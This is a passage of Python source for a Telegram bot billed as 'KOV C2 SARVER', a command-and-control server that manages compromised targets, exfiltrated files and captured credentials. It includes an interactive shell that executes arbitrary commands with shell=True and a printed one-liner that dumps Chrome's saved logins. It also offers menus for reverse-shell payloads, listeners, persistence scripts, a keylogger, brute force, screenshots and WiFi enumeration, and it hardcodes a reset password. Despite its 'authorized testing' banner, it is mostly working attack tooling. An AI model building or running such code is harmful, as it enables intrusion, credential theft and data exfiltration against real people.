            await update.message.reply_text(f"â„¹ï¸ User `{target_id}` is not an admin.", parse_mode=ParseMode.MARKDOWN)

    elif action_type == "ban":
        if target_id == ADMIN_ID or is_admin(target_id):
            await update.message.reply_text("âŒ Cannot ban an admin.", parse_mode=ParseMode.MARKDOWN)
        elif ban_user(target_id):
            await update.message.reply_text(f"âœ… *User Banned*\nUser ID: `{target_id}`", parse_mode=ParseMode.MARKDOWN)
            add_log("user_banned", user_id, target_id)
        else:
            await update.message.reply_text(f"â„¹ï¸ User `{target_id}` is already banned.", parse_mode=ParseMode.MARKDOWN)

    elif action_type == "unban":
        if unban_user(target_id):
            await update.message.reply_text(f"âœ… *User Unbanned*\nUser ID: `{target_id}`", parse_mode=ParseMode.MARKDOWN)
            add_log("user_unbanned", user_id, target_id)
        else:
            await update.message.reply_text(f"â„¹ï¸ User `{target_id}` is not banned.", parse_mode=ParseMode.MARKDOWN)

    msg = (
        f"{BOX}\n"
        f"        âš™ï¸ *ADMIN PANEL*\n"
        f"{BOX}\n\n"
        f"Manage administrators and bans:"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
    return ConversationHandler.END

async def admin_action_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        f"{BOX}\n"
        f"        âš™ï¸ *ADMIN PANEL*\n"
        f"{BOX}\n\n"
        f"Manage administrators and bans:"
    )
    if update.callback_query:
        await update.callback_query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
    else:
        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
    return ConversationHandler.END

async def admin_view_config(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if not is_owner(user_id):
        await query.edit_message_text("âŒ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM targets")
    target_count = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM sessions")
    session_count = c.fetchone()[0]
    conn.close()
    
    user_count = len(get_users())
    admin_count = len(get_admins())
    banned_count = len(get_banned())
    
    msg = (
        f"{BOX}\n"
        f"âš™ *BOT CONFIGURATION*\n"
        f"{BOX}\n\n"
        f"*Bot Status:* ðŸŸ¢ Online\n"
        f"*Admin Count:* `{admin_count}`\n"
        f"*User Count:* `{user_count}`\n"
        f"*Banned Users:* `{banned_count}`\n"
        f"*Total Targets:* `{target_count}`\n"
        f"*Active Sessions:* `{session_count}`\n"
        f"*Database:* âœ… Connected\n"
        f"*Current Password:* `********`\n\n"
        f"{BOX}"
    )
    
    keyboard = [[InlineKeyboardButton("ðŸ”™ ADMIN PANEL", callback_data="menu_admin")]]
    await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))

async def admin_change_pass_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if not is_owner(user_id):
        await query.edit_message_text("âŒ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return ConversationHandler.END
    
    await query.edit_message_text(
        f"{BOX}\nðŸ” *CHANGE PASSWORD*\n{BOX}\n\nSend the new password:",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=build_cancel_keyboard()
    )
    return ADMIN_CHANGE_PASS

async def admin_change_pass_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("âŒ *Access Denied*", parse_mode=ParseMode.MARKDOWN)
        return ConversationHandler.END
    
    new_pass = update.message.text.strip()
    if len(new_pass) < 4:
        await update.message.reply_text("âŒ Password must be at least 4 characters. Try again:", parse_mode=ParseMode.MARKDOWN)
        return ADMIN_CHANGE_PASS
    
    set_password(new_pass)
    add_log("password_changed", user_id, details="Password changed via admin panel")
    
    await update.message.reply_text(
        f"{BOX}\nâœ… *PASSWORD CHANGED*\n{BOX}\n\nPassword has been updated successfully.",
        parse_mode=ParseMode.MARKDOWN
    )
    
    msg = (
        f"{BOX}\n"
        f"        âš™ï¸ *ADMIN PANEL*\n"
        f"{BOX}\n\n"
        f"Manage administrators and bans:"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
    return ConversationHandler.END

async def admin_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if not is_owner(user_id):
        await query.edit_message_text("âŒ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    
    logs = get_logs(20)
    if not logs:
        await query.edit_message_text("ðŸ“­ *No admin logs found.*", parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
        return
    
    msg = (
        f"{BOX}\n"
        f"ðŸ“œ *ADMIN LOGS* (Last 20)\n"
        f"{BOX}\n\n"
    )
    for log in logs:
        timestamp = log['timestamp'][:19]
        action = log['action'].replace('_', ' ').title()
        admin = log['admin_id']
        target = f" â†’ `{log['target_id']}`" if log.get('target_id') else ""
        msg += f"â€¢ [{timestamp}] *{action}*\n  Admin: `{admin}`{target}\n\n"
    
    if len(msg) > 3500:
        msg = msg[:3500] + "\n\n...[truncated]..."
    
    keyboard = [[InlineKeyboardButton("ðŸ”™ ADMIN PANEL", callback_data="menu_admin")]]
    await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))

async def admin_dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if not is_owner(user_id):
        await query.edit_message_text("âŒ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM targets")
    targets_total = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM targets WHERE status='active'")
    targets_active = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM sessions")
    sessions = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM commands")
    commands = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM files")
    files = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM credentials")
    creds = c.fetchone()[0]
    conn.close()
    
    users = len(get_users())
    admins = len(get_admins())
    banned = len(get_banned())
    logs = len(load_json(LOGS_PATH))
    
    msg = (
        f"{BOX}\n"
        f"ðŸ“Š *ADMIN DASHBOARD*\n"
        f"{BOX}\n\n"
        f"*Users:* `{users}`\n"
        f"*Admins:* `{admins}`\n"
        f"*Banned:* `{banned}`\n"
        f"*Targets:* `{targets_active}/{targets_total}`\n"
        f"*Sessions:* `{sessions}`\n"
        f"*Commands:* `{commands}`\n"
        f"*Files:* `{files}`\n"
        f"*Credentials:* `{creds}`\n"
        f"*Log Entries:* `{logs}`\n"
        f"{BOX}"
    )
    
    keyboard = [[InlineKeyboardButton("ðŸ”™ ADMIN PANEL", callback_data="menu_admin")]]
    await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))

async def admin_notifications(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if not is_owner(user_id):
        await query.edit_message_text("âŒ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    
    notified = get_notified_users()
    msg = (
        f"{BOX}\n"
        f"ðŸ”” *NOTIFICATION SETTINGS*\n"
        f"{BOX}\n\n"
        f"*New user notifications:* ðŸŸ¢ Enabled\n"
        f"*Users notified so far:* `{len(notified)}`\n\n"
        f"Admins are automatically notified when new users join the bot.\n"
        f"Promotion/demotion notifications are sent automatically."
    )
    
    keyboard = [[InlineKeyboardButton("ðŸ”™ ADMIN PANEL", callback_data="menu_admin")]]
    await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))

async def admin_backup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if not is_owner(user_id):
        await query.edit_message_text("âŒ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    
    try:
        backup_time = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_path = Path.home() / f"d4rk_backup_{backup_time}"
        backup_path.mkdir(exist_ok=True)
        
        if DB_PATH.exists():
            shutil.copy2(DB_PATH, backup_path / "database.db")
        if ADMINS_PATH.exists():
            shutil.copy2(ADMINS_PATH, backup_path / "admins.json")
        if BANNED_PATH.exists():
            shutil.copy2(BANNED_PATH, backup_path / "banned.json")
        if USERS_PATH.exists():
            shutil.copy2(USERS_PATH, backup_path / "users.json")
        if LOGS_PATH.exists():
            shutil.copy2(LOGS_PATH, backup_path / "logs.json")
        if NOTIFIED_PATH.exists():
            shutil.copy2(NOTIFIED_PATH, backup_path / "notified.json")
        if PASS_HASH_PATH.exists():
            shutil.copy2(PASS_HASH_PATH, backup_path / "password.hash")
        
        add_log("backup_created", user_id, details=f"Backup created at {backup_path}")
        
        msg = (
            f"{BOX}\n"
            f"ðŸ’¾ *BACKUP CREATED*\n"
            f"{BOX}\n\n"
            f"Backup saved to:\n`{backup_path}`\n\n"
            f"Files backed up:\n"
            f"â€¢ database.db\n"
            f"â€¢ admins.json\n"
            f"â€¢ banned.json\n"
            f"â€¢ users.json\n"
            f"â€¢ logs.json\n"
            f"â€¢ password.hash\n\n"
            f"*Time:* `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
        )
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
    except Exception as e:
        await query.edit_message_text(f"âŒ *Backup failed:* `{str(e)}`", parse_mode=ParseMode.MARKDOWN)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = update.effective_user.id

    if is_banned(user_id):
        await query.edit_message_text("ðŸš« *You are banned from KOV C2 SARVER.*", parse_mode=ParseMode.MARKDOWN)
        return

    if data == "start_login":
        await query.edit_message_text(
            f"{BOX}\nðŸ” *LOGIN*\n{BOX}\n\nPlease enter your password below:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=build_cancel_keyboard()
        )
        return

    if data == "start_about":
        msg = (
            f"{BOX}\n"
            f"      ðŸ”¥ *KOV C2 SARVER* ðŸ”¥\n"
            f"{BOX}\n\n"
            f"*Version:* 3.0\n"
            f"*Developer:* D4RK-K1NG\n"
            f"*Platform:* {platform.system()} {platform.release()}\n\n"
            f"*Features:*\n"
            f"â€¢ Target Management\n"
            f"â€¢ Interactive Shell\n"
            f"â€¢ Port Scanning\n"
            f"â€¢ Payload Generation\n"
            f"â€¢ Keylogger\n"
            f"â€¢ Screenshot Capture\n"
            f"â€¢ Browser Password Extraction\n"
            f"â€¢ WiFi Enumeration\n"
            f"â€¢ Brute Force\n"
            f"â€¢ File Operations\n"
            f"â€¢ Multi-Admin Support\n"
            f"â€¢ Ban/Unban System\n\n"
            f"*For authorized penetration testing only*"
        )
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_start_keyboard())
        return

    if not is_authenticated(context, user_id):
        await query.edit_message_text(
            f"{BOX}\nðŸ” *Please login first*\n{BOX}\n\nUse the LOGIN button or /login <password>",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=build_start_keyboard()
        )
        return

    context.user_data['authenticated'] = True
    update_user_last_seen(user_id)

    if data == "menu_logout":
        context.user_data['authenticated'] = False
        context.user_data['shell_target'] = None
        msg = (
            f"{BOX}\n"
            f"      ðŸ”¥ *KOV C2 SARVER* ðŸ”¥\n"
            f"{BOX}\n\n"
            f"*Developer:* D4RK-K1NG\n"
            f"*User:* {update.effective_user.full_name}\n"
            f"*ID:* `{user_id}`\n\n"
            f"{BOX}\n"
            f"*Authorized Penetration Testing*\n"
            f"*Advanced Command & Control*\n"
            f"{BOX}\n\n"
            f"ðŸ” *Please login to access the system*"
        )
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_start_keyboard())
        return

    if data == "menu_back":
        nickname = get_user_nickname(user_id) or update.effective_user.full_name
        role = "ðŸ‘‘ OWNER" if is_owner(user_id) else "ðŸ›¡ï¸ ADMIN" if is_admin(user_id) else "ðŸ‘¤ USER"
        msg = (
            f"{BOX}\n"
            f"          ðŸ“‹ *MAIN MENU*\n"
            f"{BOX}\n\n"
            f"*Welcome, {nickname}*\n"
            f"*Role:* {role}\n\n"
            f"Select an option below:"
        )
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_main_menu(is_owner(user_id)))
        return

    if data == "menu_admin":
        if not is_owner(user_id):
            await query.edit_message_text("âŒ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
            return
        msg = (
            f"{BOX}\n"
            f"        âš™ï¸ *ADMIN PANEL*\n"
            f"{BOX}\n\n"
            f"Manage administrators, bans, and bot settings:"
        )
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
        return

    if data in ("admin_add", "admin_remove", "admin_ban", "admin_unban"):
        return

    if data == "admin_list_admins":
        admins = get_admins()
        msg = f"{BOX}\nðŸ‘¥ *ADMINISTRATORS*\n{BOX}\n"
        for aid in admins:
            nickname = get_user_nickname(aid) or "Unknown"
            tag = " ðŸ‘‘ OWNER" if aid == ADMIN_ID else ""
            msg += f"  â€¢ `{aid}` ({nickname}){tag}\n"
        msg += f"\nTotal: `{len(admins)}`"
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
        return

    if data == "admin_ban_list":
        banned = get_banned()
        if not banned:
            await query.edit_message_text("âœ… *No users are banned.*", parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
            return
        msg = f"{BOX}\nðŸš« *BANNED USERS*\n{BOX}\n"
        for bid in banned:
            nickname = get_user_nickname(bid) or "Unknown"
            msg += f"  â€¢ `{bid}` ({nickname})\n"
        msg += f"\nTotal: `{len(banned)}`"
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
        return

    if data == "admin_users_list":
        users = get_users()
        if not users:
            await query.edit_message_text("ðŸ“­ *No users registered.*", parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
            return
        msg = f"{BOX}\nðŸ‘¤ *REGISTERED USERS*\n{BOX}\n"
        for u in users:
            admin_tag = " ðŸ‘‘" if is_owner(u['user_id']) else " ðŸ›¡ï¸" if is_admin(u['user_id']) else ""
            banned_tag = " ðŸš«" if is_banned(u['user_id']) else ""
            msg += f"  â€¢ `{u['user_id']}` ({u['nickname']}){admin_tag}{banned_tag}\n"
        msg += f"\nTotal: `{len(users)}`"
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
        return

    if data == "admin_reset":
        keyboard = [
            [InlineKeyboardButton("âœ… YES, RESET EVERYTHING", callback_data="reset_confirm")],
            [InlineKeyboardButton("âŒ NO, CANCEL", callback_data="admin_cancel")]
        ]
        await query.edit_message_text(
            f"{BOX}\nâš ï¸ *WARNING: RESET BOT*\n{BOX}\n\n"
            f"This will:\n"
            f"â€¢ Delete ALL targets, sessions, commands, files\n"
            f"â€¢ Remove ALL admins except owner\n"
            f"â€¢ Clear ALL banned users\n"
            f"â€¢ Reset password to `d4rk123`\n"
            f"â€¢ Delete ALL registered users\n\n"
            f"Are you sure?",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return

    if data == "reset_confirm":
        if not is_owner(user_id):
            await query.edit_message_text("âŒ *Access Denied*", parse_mode=ParseMode.MARKDOWN)
            return
        conn = get_db()
        c = conn.cursor()
        c.execute("DELETE FROM targets")
        c.execute("DELETE FROM sessions")
        c.execute("DELETE FROM commands")
        c.execute("DELETE FROM files")
        c.execute("DELETE FROM credentials")
        conn.commit()
        conn.close()
        save_json(ADMINS_PATH, [ADMIN_ID])
        save_json(BANNED_PATH, [])
        save_json(USERS_PATH, [])
        save_json(LOGS_PATH, [])
        save_json(NOTIFIED_PATH, [])
        set_password("d4rk123")
        add_log("bot_reset", user_id, details="Bot fully reset by owner")
        await query.edit_message_text(
            f"{BOX}\nâœ… *BOT RESET COMPLETE*\n{BOX}\n\n"
            f"â€¢ All data cleared\n"
            f"â€¢ Only owner retained as admin\n"
            f"â€¢ Password reset to: `d4rk123`\n"
            f"â€¢ All users removed\n\n"
            f"Restart the bot and re-login.",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "admin_cancel":
        msg = (
            f"{BOX}\n"
            f"        âš™ï¸ *ADMIN PANEL*\n"
            f"{BOX}\n\n"
            f"Manage administrators and bans:"
        )
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
        return

    if data == "admin_view_config":
        await admin_view_config(update, context)
        return

    if data == "admin_change_pass":
        await admin_change_pass_start(update, context)
        return

    if data == "admin_logs":
        await admin_logs(update, context)
        return

    if data == "admin_dashboard":
        await admin_dashboard(update, context)
        return

    if data == "admin_notifications":
        await admin_notifications(update, context)
        return

    if data == "admin_backup":
        await admin_backup(update, context)
        return

    menu_nav = {
        "menu_targets": ("ðŸŽ¯ *Targets*\n\n/targets - List all targets\n/addtarget <hostname> <ip> - Add target\n/removetarget <id> - Remove target", build_back_keyboard()),
        "menu_shell": ("ðŸ’» *Shell Mode*\n\nUse: /shell <target_id>\nOr select a target from /targets", build_back_keyboard()),
        "menu_scan": ("ðŸ” *Scanner*\n\n/scan <target_id> [ports] - Quick port scan\n/nmap <target> [args] - Nmap scan\n/osint <target> - OSINT gathering", build_back_keyboard()),
        "menu_files": ("ðŸ“ *File Operations*\n\n/upload <target_id> - Upload file to target\n/listfiles <target_id> - List exfiltrated files", build_back_keyboard()),
        "menu_payloads": ("ðŸ’‰ *Payload Generation*\n\n/payload <lhost> <lport> [os]\nOS: linux (default), windows", build_back_keyboard()),
        "menu_listener": ("ðŸŽ§ *Listener*\n\n/listener <port> - Start listener\n/stoplistener - Stop listener\n\nUse /payload to generate a matching reverse shell.", build_back_keyboard()),
        "menu_postex": ("ðŸ§° *Post-Exploitation*\n\n/keylogger <id> - Keylogger simulation\n/screenshot <id> - Take screenshot\n/persistence <id> - Generate persistence script\n/browserpass <id> - Browser password extraction\n/wifi <id> - WiFi enumeration", build_back_keyboard()),
        "menu_brute": ("ðŸ”¨ *Brute Force*\n\n/brute <target> <username> <wordlist>\n\nExample: /brute 192.168.1.1 root /usr/share/wordlists/rockyou.txt", build_back_keyboard()),
        "menu_help": (
            f"{BOX}\n"
            f"     ðŸ“– *KOV C2 - COMMANDS*\n"
            f"{BOX}\n\n"
            f"*AUTHENTICATION*\n"
            f"/login <pass> - Login\n"
            f"/setpass <pass> - Change password\n"
            f"/menu - Show main menu\n\n"
            f"*TARGETS*\n"
            f"/targets - List targets\n"
            f"/addtarget <hostname> <ip> - Add target\n"
            f"/removetarget <id> - Remove target\n\n"
            f"*COMMANDS*\n"
            f"/shell <id> - Interactive shell\n"
            f"/cmd <id> <cmd> - Execute command\n"
            f"/scan <id> [ports] - Port scan\n\n"
            f"*FILES*\n"
            f"/upload <id> - Upload file\n"
            f"/listfiles <id> - List files\n\n"
            f"*POST-EXPLOITATION*\n"
            f"/screenshot <id> - Screenshot\n"
            f"/persistence <id> - Persistence\n"
            f"/browserpass <id> - Browser passwords\n"
            f"/wifi <id> - WiFi enumeration\n\n"
            f"*OTHER*\n"
            f"/payload <host> <port> [os] - Payload\n"
            f"/listener <port> - Start listener\n"
            f"/info - System info\n"
            f"/status - Bot status\n\n"
            f"*DEVELOPER:* D4RK-K1NG",
            None
        ),
    }

    if data in menu_nav:
        msg, kb = menu_nav[data]
        if kb is None:
            await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN)
        else:
            await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
        return

    if data == "menu_info":
        s_info = get_system_info()
        msg = (
            f"{BOX}\n"
            f"ðŸ–¥ *KOV C2 SYSTEM INFO*\n"
            f"{BOX}\n"
            f"*Hostname:* `{s_info['hostname']}`\n"
            f"*OS:* `{s_info['platform']} {s_info['platform_release']}`\n"
            f"*Arch:* `{s_info['architecture']}`\n"
            f"*IP:* `{s_info['ip']}`\n"
            f"*CPU:* `{s_info['cpu_count']} cores`\n"
            f"*RAM:* `{s_info['memory']} ({s_info['memory_used']})`\n"
            f"*Disk:* `{s_info['disk']} ({s_info['disk_used']})`\n"
            f"*Python:* `{s_info['python_version'][:30]}...`\n"
            f"*Uptime:* `{s_info['uptime']}`\n"
            f"{BOX}"
        )
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
        return

    if data == "menu_status":
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM targets WHERE status='active'")
        active_targets = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM targets")
        total_targets = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM sessions WHERE active=1")
        active_sessions = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM commands WHERE status='pending'")
        pending_cmds = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM files")
        total_files = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM credentials")
        total_creds = c.fetchone()[0]
        conn.close()
        listener_status = "ðŸŸ¢ Running" if context.bot_data.get('listener_running') else "ðŸ”´ Stopped"
        listener_port = context.bot_data.get('listener_port', 'N/A')
        msg = (
            f"{BOX}\n"
            f"ðŸ“Š *KOV C2 STATUS*\n"
            f"{BOX}\n"
            f"ðŸŽ¯ Active Targets: `{active_targets}/{total_targets}`\n"
            f"ðŸ’» Active Sessions: `{active_sessions}`\n"
            f"â³ Pending Commands: `{pending_cmds}`\n"
            f"ðŸ“ Exfiltrated Files: `{total_files}`\n"
            f"ðŸ”‘ Captured Credentials: `{total_creds}`\n"
            f"ðŸŽ§ Listener: {listener_status} (port {listener_port})\n"
            f"{BOX}"
        )
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
        return

    if data.startswith("target:"):
        target_id = data.split(":")[1]
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT * FROM targets WHERE id = ?", (target_id,))
        target = c.fetchone()
        c.execute("SELECT * FROM commands WHERE target_id = ? ORDER BY executed_at DESC LIMIT 5", (target_id,))
        recent_cmds = c.fetchall()
        conn.close()
        if not target:
            await query.edit_message_text("âŒ Target not found")
            return
        msg = (
            f"{BOX}\n"
            f"ðŸŽ¯ *Target: {target['hostname']}*\n"
            f"{BOX}\n"
            f"ðŸ†” ID: `{target['id']}`\n"
            f"ðŸŒ IP: `{target['ip']}`\n"
            f"ðŸ’» OS: `{target['os'] or 'Unknown'}`\n"
            f"ðŸ‘¤ User: `{target['username'] or 'N/A'}`\n"
            f"ðŸ“… First Seen: `{target['first_seen']}`\n"
            f"ðŸ“… Last Seen: `{target['last_seen']}`\n"
            f"ðŸ”´ Status: `{target['status']}`\n"
            f"{BOX}\n"
            f"*Recent Commands:*\n"
        )
        for cmd in recent_cmds:
            msg += f"`$ {cmd['command'][:50]}...`\n"
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_target_actions_keyboard(target_id))
        return

    if data.startswith("shell:"):
        target_id = data.split(":")[1]
        context.user_data['shell_target'] = target_id
        await query.edit_message_text(
            f"ðŸ’» *Shell Mode - Target {target_id}*\n"
            f"Send commands directly.\nUse `exit` to close.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=build_back_keyboard()
        )
        return

    if data.startswith("scan:"):
        target_id = data.split(":")[1]
        await query.edit_message_text(f"ðŸ” *Scanning target {target_id}...*", parse_mode=ParseMode.MARKDOWN)
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT ip FROM targets WHERE id = ?", (target_id,))
        target = c.fetchone()
        conn.close()
        if target:
            results = network_scan(target['ip'])
            if results:
                msg = f"ðŸ” *Open Ports on {target['ip']}*\n"
                for r in results[:20]:
                    msg += f"  â”œ PORT `{r['port']}` - {r['service']}\n"
                await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN)
            else:
                await query.edit_message_text("ðŸ“­ *No open ports found*", parse_mode=ParseMode.MARKDOWN)
        return

    if data.startswith("listfiles:"):
        target_id = data.split(":")[1]
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT * FROM files WHERE target_id = ? ORDER BY exfiltrated_at DESC", (target_id,))
        files = c.fetchall()
        conn.close()
        if not files:
            await query.edit_message_text(f"ðŸ“­ *No files for target {target_id}*", parse_mode=ParseMode.MARKDOWN)
            return
        msg = f"ðŸ“ *Exfiltrated Files - Target {target_id}*\n{BOX}\n"
        for f in files:
            size_str = f"{f['size']/1024:.1f} KB" if f['size'] else "Unknown"
            msg += f"\nðŸ“„ `{f['filename']}`\n  â”œ Size: {size_str}\n  â”” Date: `{f['exfiltrated_at']}`\n"
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN)
        return

    if data.startswith("browserpass:"):
        target_id = data.split(":")[1]
        await query.edit_message_text(
            f"ðŸ”‘ *Browser Password Extraction - Target {target_id}*\n\n"
            f"*Chrome/Linux:*\n```\npython3 -c \"import sqlite3,os; p=os.path.expanduser('~/.config/google-chrome/Default/Login Data'); c=sqlite3.connect(p); for r in c.execute('SELECT origin_url,username_value,password_value FROM logins'): print(r)\"\n```\n"
            f"*Firefox:*\n```\nls ~/.mozilla/firefox/*.default-release/logins.json\n```",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data.startswith("persist:"):
        target_id = data.split(":")[1]
        await query.edit_message_text(
            f"ðŸ”— *Persistence Script - Target {target_id}*\n```\n{generate_persistence_script()}\n```\nReplace LHOST and LPORT before deploying.",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data.startswith("screenshot:"):
        target_id = data.split(":")[1]
        await query.edit_message_text(f"ðŸ“¸ *Taking screenshot on target {target_id}...*", parse_mode=ParseMode.MARKDOWN)
        try:
            img_path = f"/tmp/d4rk_ss_{int(time.time())}.png"
            result = subprocess.run(["scrot", img_path], capture_output=True, timeout=10)
            if os.path.exists(img_path):
                with open(img_path, 'rb') as f:
                    await query.message.reply_photo(photo=InputFile(f, filename="screenshot.png"), caption="ðŸ“¸ *Screenshot captured*", parse_mode=ParseMode.MARKDOWN)
                os.remove(img_path)
            else:
                await query.edit_message_text("âŒ *Screenshot failed* - no display found.", parse_mode=ParseMode.MARKDOWN)
        except:
            await query.edit_message_text("âŒ *Screenshot not available*", parse_mode=ParseMode.MARKDOWN)
        return

    if data.startswith("wifi:"):
        target_id = data.split(":")[1]
        await query.edit_message_text(f"ðŸ“¶ *Enumerating WiFi on target {target_id}...*", parse_mode=ParseMode.MARKDOWN)
        try:
            result = subprocess.run(["nmcli", "dev", "wifi", "list"], capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                output = result.stdout[:3500]
            else:
                result = subprocess.run(["iwlist", "scan"], capture_output=True, text=True, timeout=10)
                output = result.stdout[:3500] if result.stdout else "No WiFi interfaces found"
        except:
            output = "WiFi enumeration requires nmcli or iwlist"
        await query.edit_message_text(f"ðŸ“¶ *WiFi Networks*\n```\n{output}\n```", parse_mode=ParseMode.MARKDOWN)
        return

    if data.startswith("keylogger:"):
        target_id = data.split(":")[1]
        await query.edit_message_text(
            f"âŒ¨ï¸ *Keylogger for Target {target_id}*\n"
            f"(Simulated - deploys via reverse shell on real target)\n"
            f"Use /cmd {target_id} <command> to execute on target.",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data.startswith("remove:"):
        target_id = data.split(":")[1]
        conn = get_db()
        c = conn.cursor()
        c.execute("DELETE FROM targets WHERE id = ?", (target_id,))
        c.execute("DELETE FROM sessions WHERE target_id = ?", (target_id,))
        c.execute("DELETE FROM commands WHERE target_id = ?", (target_id,))
        c.execute("DELETE FROM files WHERE target_id = ?", (target_id,))
        c.execute("DELETE FROM credentials WHERE target_id = ?", (target_id,))
        conn.commit()
        conn.close()
        await query.edit_message_text(
            f"âœ… *Target `{target_id}` removed*",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=build_back_keyboard()
        )
        return

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_banned(user_id):
        await update.message.reply_text("ðŸš« You are banned from KOV C2 SARVER.")
        return
    
    if not is_authenticated(context, user_id):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return
    
    text = update.message.text
    update_user_last_seen(user_id)
    
    shell_target = context.user_data.get('shell_target')
    if shell_target:
        if text.lower() == 'exit':
            context.user_data['shell_target'] = None
            await update.message.reply_text("ðŸ’» *Shell closed*", parse_mode=ParseMode.MARKDOWN)
            return
        
        try:
            result = subprocess.run(text, shell=True, capture_output=True, text=True, timeout=60)
            output = result.stdout + result.stderr
            if not output:
                output = "[No output]"
            
            conn = get_db()
            c = conn.cursor()
            c.execute("INSERT INTO commands (target_id, command, output, status, executed_at) VALUES (?, ?, ?, 'completed', datetime('now'))", (shell_target, text, output[:5000]))
            conn.commit()
            conn.close()
            
            if len(output) > 3500:
                output = output[:3500] + "\n\n...[truncated]..."
            
            await update.message.reply_text(f"```\n{output}\n```", parse_mode=ParseMode.MARKDOWN)
        except subprocess.TimeoutExpired:
